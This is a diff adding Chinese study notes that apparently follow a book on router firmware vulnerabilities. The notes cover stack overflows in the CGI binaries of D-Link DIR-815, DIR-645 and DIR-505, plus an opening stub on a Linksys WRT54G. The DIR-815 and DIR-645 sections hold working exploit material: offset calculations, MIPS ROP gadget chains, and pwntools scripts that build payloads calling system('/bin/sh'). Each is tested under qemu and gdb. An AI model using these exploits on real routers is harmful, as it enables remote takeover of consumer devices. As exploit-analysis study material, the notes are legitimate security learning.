@@ -110,6 +110,7 @@ binwalk -Me firmware.bin
 模拟器
 ```C
 sudo apt-get install qemu
+apt-get install qemu binfmt-support qemu-user-static
 ```
 运行
 ```C
@@ -290,6 +291,365 @@ binwalk -Me "DIR-815 FW 1.01b14_1.01b14.bin"
 ```
 该漏洞的核心组件为`/htdocs/web/hedwig.cgi`。该组件是一个指向`/htdocs/cgibin`的符号链接。
 
-漏洞公告中描述漏洞产生的原因是Cookie的值`过长`
+将`/htdocs/cgibin`拖到IDA里面，漏洞公告中描述漏洞产生的原因是Cookie的值`过长`，CGI脚本中一般是通过`char *getenv("HTTP_COOKIE")`来获取cookie值，因此可在IDA中搜索字符串`"HTTP_COOKIE"`查看它的交叉引用，看是否可以找到关键函数。
+
+看到该字符串只有一个函数引用，该函数为`sess_get_uid`，看该区域代码为：
+```C
+lui     $a0, 0x42
+la      $t9, getenv
+la      $a0, aHttpCookie  # "HTTP_COOKIE"
+jalr    $t9 ; getenv
+```
+确实是`char *getenv("HTTP_COOKIE")`函数调用的汇编代码。再查看`sess_get_uid`函数的交叉引用，看到该函数再`hedwigcgi_main+1C0`以及`hedwigcgi_main+1C8`处有引用。跟踪到`hedwigcgi_main+1C0`的位置，看到地址`0x409680`处有个危险函数`sprintf`函数的引用，初步判断这个地方可能为栈溢出发生的地方。
+
+cookie的形式为`uid=payload`才会被程序接受，为了验证是否是`0x409680`处的地址造成该溢出漏洞，采用动态调试进行验证。
+```bash
+# cgi_run.sh
+# sudo ./cgi_run.sh  'uid=1234'  `python  -c "print 'uid=1234&password='+'A'*600"`
+
+INPUT="$1"
+TEST="$2"
+LEN=$(echo -n "$INPUT" | wc -c)
+PORT="1234"
+if [ "$LEN" == "0" ] || [ "$INPUT" == "-h" ] || [ "$UID" != "0" ]
+then
+    echo -e "\nusage: sudo $0\n"
+    exit 1
+fi
+cp $(which qemu-mipsel) ./qemu
+
+echo "$INPUT" | chroot . ./qemu -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE="application/x-www-form-urlencodede" -E SCRIPT_NAME="common" -E REQUEST_METHOD="POST" -E HTTP_COOKIE=$TEST -E REQUEST_URI="/hedwig.cgi" -E REMOTE_ADDR="192.168.1.1" -g $PORT `/htdocs/web/hedwig.cgi` 2>/dev/null
+echo "run ok"
+rm -f ./qemu
+```
+
+调试步骤：
+
+1. 使用以下命令运行`cgi_run.sh`，此时qemu运行hedwig.cgi，并等待gdb连接到端口1234
+``` 
+sudo ./cgi_run.sh  'uid=1234'  `python  -c "print 'uid=1234&password='+'A'*0x600"`
+```
+2. gdb-multiarch调试hedwig.cgi，并在可疑地址`0x409680`处以及调用获取uid的地址`0x409648`处下断。
+
+对比`0x409680`指令前后存放$ra的区域，可以看到该内存确实被覆盖了，而且在最后程序返回时也确实可以看到崩溃了。
+但是阅读汇编代码后，发现后面在`0x4096b4`处以写的形式打开了`/var/tmp/temp.xml`文件，对固件目录进行检查时发现，`/var`目录是空的，不存在`/var/tmp/`目录。
+
+由于我没有实体固件路由器，所以无法确定真实环境中是否有该目录，因此只能根据书中的描述来认为该环境中确实存在该目录，并在`/var`目录下创建了`/tmp`目录以尽可能的模拟真实环境。
+
+继续阅读汇编代码，发现并不是只有`0x409680`处调用了`sprintf`函数，在`0x40997C`处也调用了该函数。
+
+再回头去看一遍函数流程，可以得到再`0x409680`处调用了`sprintf`函数形成栈溢出，后续创建`/var/tmp/temp.xml`，如果创建失败的话，程序返回；如果创建成功，会继续执行且在`0x40997C`处再次调用`sprintf`函数再次形成栈溢出。
+
+因此真实环境中，会形成两次栈溢出且栈的最后状态由第二次溢出也就是`0x40997C`处的栈溢出决定，所以一不小心就会造成误判。
+
+漏洞利用的步骤为：
+
+1. 确定缓冲区大小，控制偏移以实现对PC的劫持。
+2. 编写代码，通过qemu虚拟机调试验证。
+3. 确定攻击路径，构造ROP。
+4. 构建利用攻击数据，编写exp。
+
+首先是第一步，缓冲区大小判定，可以使用创建模式字符串去调试确认，但是我都是通过IDA静态分析确定的。在IDA中对缓冲区位置以及存储$ra的地址进行查看，根据公式得到偏移为：
+```C
+offset=saved_ra-buf_addr=-0x4-0x428=0x424
+```
+同时我们知道`sprintf`函数的函数声明是`sprintf(char *str, char *format, ...)`，找到对应的参数第二个参数format是`htdocs/webinc/fatlady.php\nprefix=%s/%s`，第二个参数是`/runtime/session`，第三个参数是我们可控的`cookie`，因此需要达到控制PC的输入长度为：
+```C
+offset=0x424-len("/htdocs/webinc/fatlady.php\nprefix=/runtime/session/")
+offset=0x3f1
+```
+
+第二步，动态确认。在调试之前，首先要创建`/var/tmp/`目录，开始调试时在溢出地址`0x40997C`处以及返回地址`0x409A28`下断。使用命令
+```C
+sudo ./cgi_run.sh  'uid=1234'  `python  -c "print 'uid='+'A'*0x3f2+'B'*0x4"
+```
+来启动程序，并使用gdb-multiarch加载程序进行调试，可以看到在`sprintf`后存储$ra内存区域被覆盖为了0x42424242，即我们已成功控制PC，验证成功。
+
+第三步，确定攻击路径，构造ROP。查看hedwig_main函数返回处的汇编指令，知道了溢出数据可导致$ra、$fp、$s7、$s6、$s5、$s4、$s3、$s2、$s1、$s0等寄存器可控。
+```C
+lw      $ra, 0x4E8+var_4($sp)
+move    $v0, $s7
+lw      $fp, 0x4E8+var_8($sp)
+lw      $s7, 0x4E8+var_C($sp)
+lw      $s6, 0x4E8+var_10($sp)
+lw      $s5, 0x4E8+var_14($sp)
+lw      $s4, 0x4E8+var_18($sp)
+lw      $s3, 0x4E8+var_1C($sp)
+lw      $s2, 0x4E8+var_20($sp)
+lw      $s1, 0x4E8+var_24($sp)
+lw      $s0, 0x4E8+var_28($sp)
+jr      $ra
+```
+构造ROP首先是要找到`system`函数地址，将`libc.so.0`拖进`ida`并搜索函数`system`得到地址偏移为`0x53200`。
+
+找到该函数后，我们需要寻找到可以调用该函数的gadget。这时候`MIPSROP`就派上用场了。
+使用命令`mipsrop.stackfinder()`寻找相应的把栈里面的数据扔到寄存器的指令，找到一条指令如下：
+```C
+python>mipsrop.stackfinder()
+------------------------------------------------------------------
+|  Address     |  Action                     |  Control Jump      |
+------------------------------------------------------------------
+|  0x000159CC  |  addiu $s5,$sp,0x170+var_160|  jalr  $s0         |
+
+.text:000159CC                 addiu   $s5, $sp, 0x170+var_160
+.text:000159D0                 move    $a1, $s3
+.text:000159D4                 move    $a2, $s1
+.text:000159D8                 move    $t9, $s0
+.text:000159DC                 jalr    $t9 ; 
+.text:000159E0                 move    $a0, $s5
+```
+可以看到这条指令把\$sp+0x10地址存入\$s5中，并在`0x159E0`处将\$s5寄存器的值作为参数传递给\$a0，并且将\$s0中的值作为地址进行调用，因此只需将\$s0中的值赋值为system函数的地址，并将\$sp+0x10地址赋值为需要执行的命令即可实现`system('command')`的函数调用。又因为前面提过\$s0寄存器可控，所以现在从理论上来说已经实现了ROP完整攻击的设计。
+
+书上提到过一个问题，即libc.so.0库的基址为0x2aaf8000，而system的偏移为`0x53200`，二者相加的system函数地址`0x2ab4b200`的末位仍然是`\x00`，会使得sprintf函数截断字符串导致攻击失败。
+
+解决办法为：首先将\$s0覆盖为目标地址附近的不包含`\x00`的地址，然后在libc中搜索指令，通过对\$s0进行加减操作，将该寄存器中的值改变为需要的地址。
+
+具体来说实现如下：将\$s0的地址覆盖为`0x2ab4b1ff`，然后在libc中搜索一条指令对$s0进行操作，再跳转到`call system`指令，搜索指令的命令为`mipsrop.find('addiu $s0,1')`。
+```c
+Python>mipsrop.find('addiu $s0,1')
+-------------------------------------------------------------------
+|  Address     |  Action              |  Control Jump             |
+-------------------------------------------------------------------
+|  0x000158C8  |  addiu $s0,1         |  jalr  $s5                |
+```
+
+所以完整的ROP链为`0x000158C8 --> 0x159CC `
+
+完整exp如下：
+
+```PYTHON
+from pwn import *
+
+system_addr=0x76738000+0x53200
+gadget1=0x76738000+0x000158C8
+gadget2=0x76738000+0x000159CC 
+addr=0x76fff218-0x300
+f=open("payload","wb")
+data='uid='
+data+='A'*(0x3f1-0x24)+p32(system_addr-1)+p32(addr)*4+p32(gadget2)+p32(addr)*2+p32(addr)+p32(gadget1)+p32(addr)*4+'/bin/sh\x00'
+f.write(data)
+f.close()
+```
+```C
+#!/bin/bash
+# cgi_run.sh
+# sudo ./cgi_run.sh `
+
+python generate.py
+INPUT=$(<payload)
+
+LEN=$(echo $INPUT | wc -c)
+PORT="1234"
+
+echo $LEN
+echo 123
+echo $INPUT
+echo $UID
+
+if [ "$LEN" == "0" ] || [ "$INPUT" == "-h" ] || [ "$UID" != "0" ]
+then
+    echo -e "\nusage: sudo $0\n"
+    exit 1
+fi
+
+cp $(which qemu-mipsel-static) ./qemu
+
+echo "$INPUT"  | chroot .  ./qemu  -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE="application/x-www-form-urlencodede" -E REQUEST_METHOD="POST" -E HTTP_COOKIE=$INPUT -E REQUEST_URI="/hedwig.cgi" -E REMOTE_ADDR="192.168.1.1" -g $PORT /htdocs/web/hedwig.cgi #2>/dev/null
+echo "run ok"
+rm -f ./qemu
+```
+
+不晓得为什么没有得到shell。都执行system('/bin/sh')了。不知道是不是必须要在真实路由器上面跑啊。。。。。先放这里，后面再回来看。
+
+## 第11章 D-Link DIR-645路由器溢出漏洞分析
+
+### 漏洞分析
+
+漏洞是CGI脚本authentiction.cgi在读取POST参数中“password”参数的值时可造成缓冲区溢出。下载固件DIR—645\_FIRMWARE\_1.03.ZIP，链接是[ftp://ftp2.dlink.com/PRODUCTS/DIR-645/REVA/DIR-645_FIRMWARE_1.03.ZIP](ftp://ftp2.dlink.com/PRODUCTS/DIR-645/REVA/DIR-645_FIRMWARE_1.03.ZIP)。
+
+binwalk 解压固件提取出文件系统。
+```C
+binwalk -Me dir645_FW_103.bin
+```
+
+漏洞的核心组件是`./htdocs/web/authentication.cgi`，file查看得到
+```C
+file ./htdocs/web/authentication.cgi 
+./htdocs/web/authentication.cgi: broken symbolic link to /htdocs/cgibin
+```
+真正的漏洞在cgibin中。
+
+直接使用poc，对程序进行测试。
+```bash
+#!/bin/bash
+# cgi_run.sh
+# sudo ./cgi_run.sh `python -c  "print 'uid=1234&password='+'A'*0x600"` "uid=1234"
+
+INPUT="$1"
+TEST="$2"
+
+LEN=$(echo -n $INPUT | wc -c)
+PORT="1234"
+
+
+if [ "$LEN" == "0" ] || [ "$INPUT" == "-h" ] || [ "$UID" != "0" ]
+then
+    echo -e "\nusage: sudo $0\n"
+    exit 1
+fi
+
+cp $(which qemu-mipsel-static) ./qemu
+
+echo "$INPUT"  | chroot .  ./qemu  -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE="application/x-www-form-urlencodede" -E REQUEST_METHOD="POST"  -E REQUEST_URI="/authentication.cgi" -E REMOTE_ADDR="192.168.1.1" -g $PORT /htdocs/web/authentication.cgi 2>/dev/null
+echo "run ok"
+rm -f ./qemu
+```
+gdb中在`authenticationcgi_main`入口处`0x40B028`下断，单步跟踪，发现在地址`0x40B500`处的read函数处覆盖率saved_ra，为了避免遇到与前一章相同的二次溢出的问题，继续单步下去。
+
+发现在`0x40b514`处调用函数`0x40a424`处报错，重新调试，并在该地址下断点。跟进去该函数。单步跟下去，发现是在地址`0x40A494`处出错，并且报错信息为：
+```C
+   0x7676c8a0 <memcmp+16>    lbu    $v0, ($a1)
+   0x7676c8a4 <memcmp+20>    addiu  $a0, $a0, 1
+   0x7676c8a8 <memcmp+24>    subu   $v0, $v1, $v0
+
+i r $a1
+a1: 0x41414141
+```
+可以看到\$a1被覆盖为了0x41414141，从而导致访存错误。
+
+尝试减小字符串，来查看是否仍然会崩溃。使用以下payload发现可成功控制pc，因此可确定导致溢出的原因为`0x40B500`处的read函数。
+```c
+sudo ./cgi_run.sh `python -c "print 'uid=1234&password='+'A'*1160"` "uid=1234"
+```
+
+阅读汇编代码，发现该处的read函数调用为：
+```C
+read( fileno(stdin), var_430, atoi(getenv("CONTENT_LENGTH")));
+```
+所以很容易看到溢出的原理是没有对`CONTENT_LENGTH`进行限制，而缓冲区空间有限，导致溢出。
+
+对后面的代码分析，发现在`0x40B550`处其要求参数的值必须包括`id=`以及`password=`，否则会提前报错，因此可构造exp。
+
+### 漏洞利用
+
+从IDA中可以得到覆盖pc的字符串偏移为：
+```c
+offset=-0x4-0x430=0x42c
+len=0x42c-len('uid=1234&password=')=1050
+```
+进行测试，发现刚好覆盖saved_ra：
+```c
+sudo ./cgi_run.sh `python -c "print 'uid=1234&password='+'A'*1050+'B'*4"` "uid=1234"
+```
+
+可使用与上一章相同的gadget来实现ROP。
+
+ulibc中system地址为`0x53200`，mipsrop寻找gadget为：
+```C
+python>mipsrop.stackfinder()
+------------------------------------------------------------------
+|  Address     |  Action                     |  Control Jump      |
+------------------------------------------------------------------
+|  0x000159CC  |  addiu $s5,$sp,0x170+var_160|  jalr  $s0         |
+
+.text:000159CC                 addiu   $s5, $sp, 0x170+var_160
+.text:000159D0                 move    $a1, $s3
+.text:000159D4                 move    $a2, $s1
+.text:000159D8                 move    $t9, $s0
+.text:000159DC                 jalr    $t9 ; 
+.text:000159E0                 move    $a0, $s5
+```
+因此完整exp为：
+```PYTHON
+from pwn import *
+
+system_addr=0x76738000+0x53200
+gadget=0x76738000+0x000159CC 
+f=open("payload","wb")
+data='uid=1234&password='
+data+='A'*(1050-0x24)+p32(system_addr)+'A'*0x20+p32(gadget)+'A'*0x10+'/bin/sh\x00'
+f.write(data)
+f.close()
+```
+```C
+#!/bin/bash
+# cgi_run.sh
+# sudo ./cgi_run.sh `
+
+python generate.py
+INPUT=$(<payload)
+
+LEN=$(echo $INPUT | wc -c)
+PORT="1234"
+
+
+if [ "$LEN" == "0" ] || [ "$INPUT" == "-h" ] || [ "$UID" != "0" ]
+then
+    echo -e "\nusage: sudo $0\n"
+    exit 1
+fi
+
+cp $(which qemu-mipsel-static) ./qemu
+
+echo "$INPUT"  | chroot .  ./qemu  -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE="application/x-www-form-urlencodede" -E REQUEST_METHOD="POST"  -E REQUEST_URI="/authentication.cgi" -E REMOTE_ADDR="192.168.1.1" -g $PORT /htdocs/web/authentication.cgi 2>/dev/null
+rm -f ./qemu
+```
+
+## 第十二章 D-Link DIR-505便携路由器越界漏洞分析
+
+### 漏洞分析
+
+固件下载地址：[ftp://ftp2.dlink.com/PRODUCTS/DIR-505/REVA/DIR-505_FIRMWARE_1.08B10.ZIP](ftp://ftp2.dlink.com/PRODUCTS/DIR-505/REVA/DIR-505_FIRMWARE_1.08B10.ZIP)
+
+漏洞存在于名为“my_cgi.cgi”的cgi脚本中。下载固件，binwalk解压出来，找到该漏洞的核心组件`usr/bin/my_cgi.cgi`，直接使用poc对代码进行调试。
+```C
+#!/bin/bash
+# cgi_run.sh
+# sudo ./cgi_run.sh
+
+python generate.py
+INPUT=`python -c "print 'storage_path='+'B'*477472+'A'*4"`
+
+LEN=$(echo $INPUT | wc -c)
+PORT="1234"
+
+
+if [ "$LEN" == "0" ] || [ "$INPUT" == "-h" ] || [ "$UID" != "0" ]
+then
+    echo -e "\nusage: sudo $0\n"
+    exit 1
+fi
+
+cp $(which qemu-mipsel-static) ./qemu
+
+echo "$INPUT"  | chroot .  ./qemu  -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE="multipart/formdata" -E SCRIPT_NAME="common"  -E REQUEST_METHOD="POST"  -E REQUEST_URI="/my_cgi.cgi" -E REMOTE_ADDR="192.168.1.1" -g $PORT /usr/bin/my_cgi.cgi 2>/dev/null
+echo "run ok"
+rm -f ./qemu
+```
+
+问题发生在post参数`storage_path`，所以在ida中搜索字符串找到该字符串并查看交叉引用，发现有好几个。
+
+有一个叫`get_input_entries`函数，从字面上理解可能为获取输入，为可疑溢出点，查看该函数。在该函数下断点，并通过动静态分析，发现其确实为输入处理的地方，使用了一个for循环将数据存入main函数传入的栈中。
+
+通过对调用函数main函数的分析发现，漏洞产生的原因在于没有对`CONTENT_LENTGTH`进行长度的检查导致栈溢出。
+
+### 漏洞利用
+
+该文件中存在system函数以及system函数的调用，经查看，发现地址`0x405B24`的代码刚好可以满足我们的需要：
+```C
+.text:00405B1C                 la      $t9, system
+.text:00405B20                 li      $s1, 0x440000
+.text:00405B24                 jalr    $t9 ; system
+.text:00405B28                 addiu   $a0, $sp, 0x78+var_50  # command
+```
+所以构造好exp即可。
+
+## 第十三章   Linksys WRT54G路由器溢出漏洞分析--运行环境修复
+
+### 漏洞分析
+
+下载链接[https://download.pchome.net/driver/network/route/wireless/down-129948-2.html](https://download.pchome.net/driver/network/route/wireless/down-129948-2.html)
+
+
 
 
